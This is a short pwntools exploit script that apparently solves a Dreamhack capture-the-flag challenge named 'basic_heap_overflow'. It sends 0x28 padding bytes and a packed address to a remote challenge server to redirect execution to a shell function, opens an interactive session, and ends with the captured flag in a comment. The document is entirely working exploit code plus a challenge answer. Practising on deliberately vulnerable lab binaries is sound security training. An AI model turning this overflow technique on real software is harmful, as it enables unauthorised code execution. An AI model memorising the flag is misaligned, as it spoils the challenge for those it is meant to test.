from pwn import * 

# p = process("./basic_heap_overflow")
p = remote("host1.dreamhack.games",8486)

shell = 0x804867b


payload = ""
payload += "a"*0x28
payload += p32(shell)

sleep(0.1)

p.sendline(payload)

p.interactive()

#DH{f1c2027b0b36ee204723079c7ae6c042}